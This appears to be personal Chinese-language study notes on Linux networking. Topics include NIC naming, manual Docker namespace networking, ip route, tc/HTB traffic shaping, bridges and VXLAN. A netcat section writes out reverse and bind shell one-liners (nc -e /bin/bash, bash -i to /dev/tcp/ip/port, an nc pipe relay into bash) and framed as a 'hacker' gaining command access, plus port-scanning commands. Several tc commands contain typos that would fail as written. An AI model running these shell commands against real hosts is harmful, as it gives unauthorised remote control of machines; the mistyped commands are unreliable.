

CENTOS7采用 dmidecode 采集命名方案，以此来得到主板信息；它可以实现网卡名字永久唯一化（dmidecode 这个命令可以采集有关硬件方面的信息管，终端输入此命令可以看到硬件相关信息内容相当于window的鲁大师）
en表示：ethernet以太网，就是平时使用的双绞线方式。
enX(X常见有下面3种类型):
o: 主板板载网卡，集成设备的设备索引号。
p: 独立网卡：PCI网卡。
s：热插拨网卡，USB之类的，扩展槽的索引号（虚拟机里面的linux也看到基本是ens33，因为是可以随时添加与删除的）。
nnn(数字)表示： MAC地址+主板信息计算得出唯一的序列（如上面的ens33 里面的33数字）。

对网络设备的命名方式：
1)如果Firmware（固件) 或 BIOS为主板上集成的设备提供的索引信息可用，且可预测则根据此索引进行命名，如:ifcfg-ens33
2)如果Firmware（固件) 或 BIOS 为 PCI-E 扩展槽所提供的索引信息可用，且可预测则根据此索引进行命名，如：ifcfg-enp33
3)如果硬件接口的物理位置信息可用，则根据此信息进行命名，例如：enp2s0
如果上述都不可用时，则使用传统命名机制，如 eth0,eth1等。


网卡模式：
	广播(Broadcast)模式
	多播(Multicast)模式
	单播模式（Unicast）
	混杂模式（Promiscuous）是电脑网络中的术语。是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。



##########################################################################################




用户使用 --net=none 后，可以自行配置网络，让容器达到跟平常一样具有访问网络的权限。通过这个过程，可以了解 Docker 配置网络的细节。
首先，启动一个 /bin/bash 容器，指定 --net=none 参数。
docker run -i -t --rm --net=none busybox /bin/bash
	root@63f36fc01b5f:/#
	
在本地主机查找容器的进程 id，并为它创建网络命名空间。
docker inspect -f '{{.State.Pid}}' 63f36fc01b5f
	2778
pid=2778
sudo mkdir -p /var/run/netns
sudo ln -s /proc/$pid/ns/net /var/run/netns/$pid

检查桥接网卡的 IP 和子网掩码信息。
ip addr show docker0
	21: docker0: ...
	inet 172.17.42.1/16 scope global docker0
	...
	
创建一对 “veth pair” 接口 A 和 B，绑定 A 到网桥 docker0，并启用它
sudo ip link add A type veth peer name B
sudo brctl addif docker0 A
sudo ip link set A up

将B放到容器的网络命名空间，命名为 eth0，启动它并配置一个可用 IP（桥接网段）和默认网关（如果是两个不同网段的网卡需要通讯，可以使用iptables的nat功能）。
sudo ip link set B netns $pid
sudo ip netns exec $pid ip link set dev B name eth0
sudo ip netns exec $pid ip link set eth0 up
sudo ip netns exec $pid ip addr add 172.17.42.99/16 dev eth0
sudo ip netns exec $pid ip route add default via 172.17.42.1



#（网桥间通讯可以使用iptables进行nat配置）对该网段的所有ip进行广播
ip route
ip route get 192.168.17.130  						       #远端ip如何到达本机，显示本机网关+本地网卡设备
ip route add default via 192.168.17.3				  	   #默认路由,不同网段需要网关(via)。
ip route add 192.168.3.0/24 dev ens33 [src 192.168.3.63]   #普通路由，同网段添加，Destination与本主机同属一个网络，无需网关(via)，src部分加不加效果一样

ip -s link									 #统计网卡数据	
ip neighbour								 #arp地址解析协议

TUN(tunnel)：linux三层虚拟设备，操作系统内核和应用程序之间传递rp包
calico BGP模式：内核原生支持



##########################################################################################



TC：流量控制，模拟传输丢包，延迟，乱序等情况
步骤:
为网卡配置一个队列;
在该队列上建立分类;
根据需要建立子队列和子分类;
为每个分类建立过滤器。

流量控制的一个基本概念是队列(Qdisc)
复杂的队列需要使用不同的过滤器(Filter)来把报文分组分成不同的类别(Class)。这里把这些复杂的队列称为可分类(ClassfuI)的队列
HTB(HierarchicaIToken Bucket)是一个可分类的队列
minor总是为0，在一个网卡的所有队列中必须是惟一的，对于类别来说，其major必须和它的父类别或父队列的major相同，内部则必须是惟一的
如果队列2:包含两个类别，则这两个类别的句柄必须是2:x这样的形式，并且它们的x不能相同， 比如2:1和2:2
为网卡eth0配置一个HTB队列：
tc qdisc add dev eth0 root handle 1:htb default 11
命令中的”add 表示要添加，”dev eth0 表示要操作的网卡为eth0。”root 表示为网卡eth0添加的是一个根队列。”handle 1: 表示队列的句柄为1:。”htb 表示要添加的队列为HTB队列。命令最后的”default 11 是htb特有的队列参数，意思是所有未分类的流量都将分配给类别1:11

可以利用下面这三个命令为根队列1创建三个类别，分别是1:1 1、1:12和1:13，它们分别占用40、40和20mb[t的带宽。
tc class add dev eth0 parent 1: classid 1:1 htb rate 40mbit ceil 40mbit
tc class add dev eth0 parent 1: classid 1:12 htb rate 40mbit ceil 40mbit
tc class add dev eth0 parent 1: cllassid 1:13 htb rate 20mbit ceil 20mbit
命令中，”parent 1:”表示类别的父亲为根队列1:。”classid1:11″表示创建一个标识为1:11的类别，”rate 40mbit”表示系统将为该类别确保带宽40mbit，”ceil 40mbit”，表示该类别的最高可占用带宽为40mbit。

需要将WWW、E-mail、Telnet三种流量分配到三个类别，即上述1:11、1:12和1:13，因此，需要创建三个过滤器，如下面的三个命令:
tc filter add dev eth0 protocol ip parent 1:0 prio 1 u32 match ip dport 80 0xffff flowid 1:11
tc filter add dev eth0 prtocol ip parent 1:0 prio 1 u32 match ip dport 25 0xffff flowid 1:12
tc filter add dev eth0 protocol ip parent 1:0 prio 1 u32 match ip dport 23 oxffff flowid 1:13
这里，”protocol ip”表示该过滤器应该检查报文分组的协议字段。”pr[o 1″ 表示它们对报文处理的优先级是相同的，对于不同优先级的过滤器， 系统将按照从小到大的优先级。
顺序来执行过滤器， 对于相同的优先级，系统将按照命令的先后顺序执行。这几个过滤器还用到了u32选择器(命令中u32后面的部分)来匹配不同的数据流。以第一个命令为例，判断的是dport字段，如果该字段与Oxffff进行与操作的结果是8O，则”flowid 1:11″ 表示将把该数据流分配给类别1:1 1

tc qdisc add dev eth0 root handle 1: htb default 21
tc class add dev eth0 partent 1: classid 1:1 htb rate 20mbit ceil 20mbit
tc class add dev eth0 parent 1: classid 1:2 htb rate 80mbit ceil 80mbit
tc class add dev eth0 parent 1:2 classid 1:21 htb rate 40mbit ceil 80mbit    
tc class add dev eth0 parent 1:2 classid 1:22 htb rate 40mbit ceil 80mbit
tc filter add dev eth0 protocol parent 10 prio 1 u32 match ip dport 80 0xffff flowid 1:21
tc filter add dev eth0 protocol parent 1:0 prio 1 u32 match ip dport 25 0xffff flowid 1:22
tc filter add dev eth0 protocol parent 1:0 prio 1 u32 match ip dport 23 0xffff flowid 1:1
这里为根队列1创建两个根类别，即1:1和1:2,其中1:1对应Telnet数据流，1:2对应80Mbit的数据流。然后，在1:2中，创建两个子类别1:21和1:22，分别对应WWW和E-mail数据流。由于类别1:21和1:22是类别1:2的子类别，因此他们可以共享分配的80Mbit带宽。同时，又确保当需要时，自己的带宽至少有40Mbit。


流量的处理由三种对象控制，它们是：qdisc(排队规则)、class(类别)和filter(过滤器)。
流量控制包括以下几种方式：
SHAPING(限制)
当流量被限制，它的传输速率就被控制在某个值以下。限制值可以大大小于有效带宽，这样可以平滑突发数据流量，使网络更为稳定。shaping（限制）只适用于向外的流量
SCHEDULING(调度)
通过调度数据包的传输，可以在带宽范围内，按照优先级分配带宽。SCHEDULING(调度)也只适于向外的流量
POLICING(策略)
SHAPING用于处理向外的流量，而POLICIING(策略)用于处理接收到的数据
DROPPING(丢弃)
如果流量超过某个设定的带宽，就丢弃数据包，不管是向内还是向外

查看：tc -s -d qdisc show dev eth0
删除tc规则：tc qdisc del dev eth0 root



##########################################################################################





https://www.cnblogs.com/zhaijiahui/p/9028402.html
1.1  nc -l -p port   			    	   		#监听444端口，信息输入输出
1.2  nc -l -p port -e /bin/bash     	   		#返回shell，可执行命令，这里的-e不要，客户端加-e可使客户端返回shell
客1  nc ip port							   		#即哪一段提供-e，另一端就会得到返回

2.1  nc -l -p port > outfile         			#接收文件, < infile  #发送文件,但是貌似客户端和服务端传输完成也会一致连接
客2  nc ip port < infile			 			#发送文件，> outfile #接收文件,-w3，超时时间为3秒
	
3.1  nc -v -z -n -w 1 192.168.3.70 80 			#端口扫描
3.2 echo " " | nc -v -z -n -w 1 192.168.3.70 80

参数：-d 后台运行  -s addr设置源ip(隐藏) -r随机化端口  -u UDP协议

1. nc -l -p port 					#连接转发，后端服务器
2. nc -l -p port -e delay.sh        #跳板机，delay.sh内容：nc 后端ip port
3. nc ip port			    		#客户端，跳板机ip
 
客1. nc -lvp port							
1.1  bash -i >& /dev/tcp/客ip/port 0>&1   #-i交互 ,本机创建一个bash环境(有两端)，传递给网络socket(文件描述符：/dev/tcp/客ip/port),则输入端0在本机，输出端1和2在网络socket
										  #客户端(黑客)向进程输入命令，客nc进程将输入的命令通过tcp连接发送给服务端nc进程(和父进程用的是一个终端),服务端执行后将结果传输会客户端的进程(和父进程用的是一个终端)
客1. nc -lvp port1                          #负责输入
     nc -lvp port2 						    #负责接收输出
1.1  nc ip port1 | /bin/bash | nc ip port2  #连接，服务端不支持-e  	 

命令拼接：
ssh root@www.freetstar.com “( nc -l 10003 > destination 2>/dev/null & )” && cat source | nc www.freetstar.com 10003
&& 前边ssh登录到远程主机www.freetstar.com上，用nc命令打开本地的10003端口,成为后台进程
&&后边，在本地机器上打开source文件，并将其重定向到www.freetstar.com的10003号端口，也就是让远程www.freetstar.com主机10003号端口接收source文件


##########################################################################################


 #ip [option] [动作] [指令]
 #option：-s 接受封包数
 #动作：link 关于设备device的相关设定(MTU,MAC)  addr/address:额外IP协议   route:与路由相关
 #ip [-s] link show
 #ip link set [device] [动作与参数]
 #参数：show显示  set设定
 #动作与参数：up/down address/name/mtu  
 #ip address [add/del] [ip参数] [dev装置名] [相关参数]
 #参数：show/add/del/ip/dev/    相关参数：broadcast [+] 设置广播地址，+代表自动分配  label设备别名  scope[global全局通讯/site本机ipv6通讯/link本装置/host/本机内部]
 #ip addr add 192.168.2.3/24 broadcast +/192.168.2.255 dev eth0 label eth0:1  
 #
 #桥接是连接两个不同的物理网段（冲突域）的技术,交换是连接多个物理网段技术，典型的交换机通常都有多个端口，每个端口实际上就是一个网桥,
 #TAP等同于一个以太网设备，它操作第二层数据包如以太网数据帧。TUN模拟了网络层设备，操作第三层数据包比如IP数据封包。
 #STP(Spanning Tree Protocol)即生成树协议，标准为IEEE802.1D-1998.STP是一种二层冗余技术，利用STA算法构建一个逻辑上没有环路的树形网络拓扑结构，并且可以通过一定的方法实现路径冗余
 
 #brctl addbr br0                            #创建一个名称为"br0"的网卡
 #绑定虚拟网桥和物理网卡，虚拟网桥通过物理网卡与外界通信
 #brctl addif br0 eth0                       #在"br0"上添加"eth0"；
 #把物理网卡地址配置为虚拟网桥的管理地址，因为容器不会直接和物理网卡通信
 #ip addr del 10.0.0.10/24 dev eth0          #将需要桥接的网卡IP清空
 #ifconfig  br0 192.168.16.107/24 up         #给"br0"配置IP；
 #添加路由
 #route add default gw 192.168.16.1          #设置默认的网关地址；
 #brctl stp br0 on                           #开启stp生成树协议
 #
 #vm1：
 #ip link add vxlan1 type vxlan id 1 remote 172.31.0.107 dstport 4789 dev eth0
 #ip link set vxlan1 up
 #ip addr add 10.0.0.106/24 dev vxlan1
 #上面的第一条命令创建了一个Linux上类型为vxlan的网络接口，名为vxlan1。
 #id: VNI标识是1。
 #remote: 作为一个VTEP设备来封装和解封VXLAN报文，需要知道将封装好的VXLAN报文发送到哪个对端VTEP。Linux上可以利用group指定组播组地址，或者利用remote指定对端单播地址。在实验的云环境中默认不支持组播，这里利用remote指定点对点的对端IP地址为172.31.0.107。
 #dstport: 指定目的端口为4789。因为当Linux内核3.7版本首次实现VXLAN时，UDP端口还并没有规定下来。很多厂商利用了8472这个端口，Linux也采用了相同的端口。后来IANA分配了4789作为VXLAN的目的UDP端口。如果你需要使用IANA端口，需要用dstport指定。
 #dev: 指定VTEP通过哪个物理device来通信，这里是使用eth0。
 #vm2: similar
 #
 ##常用命令
 #ip route get IP                          #查看获取IP通过那张网卡
 #ip link show                             #显示链路
 #ip addr show                             #显示地址(或ifconfig)
 #ip route show                            #显示路由(route -n)
 #ip neigh show                            #显示arp表(ping 192.168.95.50，如果主机在同一局域网内，直接加到arp表)
 #ip neigh delete 192.168.95.50 dev eth0   #删除arp条目，条目仍然存在状态为stale，下次通信需要确认
 #ip rule show                             #显示缺省规则
 #ip route del default dev eth0            #删除接口路由
 #ip route show table local                #查看本地静态路由
 #ip route show table main                 #查看直连路由
 #ip route add 10.1.1.0/30 encap mpls 200/300 via 10.1.1.1 dev eth0
 #
 #route 命令的输出项说明
 #输出项 说明
 #Destination	目标网段或者主机，第一条路由信息中Destination是default， Genmask是0.0.0.0. 可以认为是全网路由，也就是可以达到任务的网络地址。
 #Gateway	网关地址，”*” 表示目标是本主机所属的网络，不需要路由
 #Genmask	网络掩码
 #Flags	标记。一些可能的标记如下：
 # 	U — 路由是活动的
 # 	H — 目标是一个主机
 # 	G — 路由指向网关，需要通过外部的主机来传递数据包
 # 	R — 恢复动态路由产生的表项，动态路由
 # 	D — 由路由的后台程序动态地安装，动态路由
 # 	M — 由路由的后台程序修改
 # 	! — 拒绝路由
 #Metric	路由距离，到达指定网络所需的中转数（linux 内核中没有使用）
 #Ref	路由项引用次数（linux 内核中没有使用）
 #Use	此路由项被路由软件查找的次数
 #Iface	该路由表项对应的输出接口






 #ip netns help
 #ip netns add r1      添加名称空间
 #ip netns add r2
 #ip netns list        查看创建的名称空间
 #ip netns exec r1 ifconfig -a           在名称空间中执行命令
 #ip link help
 #ip link add name veth1.1 type veth peer name veth1.2    
 #ip link show  （ 两组：veth1.2@veth1.1 ）
 #ip link set dev veth1.2 netns r1      将网卡设备veth1.2放到r1网络名称空间中
 #ip link show  
 #ip netns exec r1 ifconfig -a
 #ip netns exec r1 ip link set dev veth1.2 name eth0  网卡改名
 #ip netns exec r1 ifconfig -a
 #ifconfig veth1.1 10.1.0.1/24 up                  激活网卡
 #ip a | grep veth1.1
 #ip netns exec r1 ifconfig eth0 10.1.0.2/24 up
 #ip netns exec r1 ifconfig
 #ping 10.1.0.2
 #ip link set dev veth1.1 netns r2
 #ip netns exec r2 iconfig
 #ip netns exec r2 ifconfig -a
 #ip netns exec r2 ifconfig veth1.1 10.1.0.3/24 up
 #ip netns exec r2 ping 10.1.0.2
 #ip link add br-sunld08-test type bridge
 #ip link set dev br-sunld08-test up
 #ip link show br-sunld08-test
 #brctl show br-sunld08-test
 #ip link add test-veth08 type veth peer name test-veth09
 #ip a
 #ifconfig test-veth08 192.168.209.135/24 up（配置并启动设备）
 #ifconfig test-veth09 192.168.209.136/24 up
 #（ip link set dev  test-veth08 up  && ip link set dev  test-veth09 up  单独激活）
 #ip link set dev test-veth08 master br-sunld08-test  #把test-veth08连接到br-sunld08-test
 #bridge link | grep test-veth08 （查看与网卡绑定的网桥）（brctl show）
 #
 #ping -c 4 192.168.209.136 -I test-veth08    
 #tcpdump -n -i test-veth09
 #从上面的抓包可以看出，去和回来的流程都没有问题，问题就出在test-veth08收到应答包后没有给协议栈，而是给了br-sunld08-test，于是协议栈得不到test-veth09的mac地址，从而通信失败。
 #
 #ip addr del 192.168.209.135/24 dev test-veth08
 #ip addr add 192.168.209.135/24 dev br-sunld08-test
 #ping -c 4 192.168.209.136 -I br-sunld08-test
 #ping -c 4 192.168.209.2 -I br-sunld08-test    ping网关
 #ip link set dev eth0 master br-sunld08-test  &&  bridge link  #将物理网卡绑定到bridge
 #brctl stp br0 off #关闭生成树协议，减少数据包污染-P07\859620454\











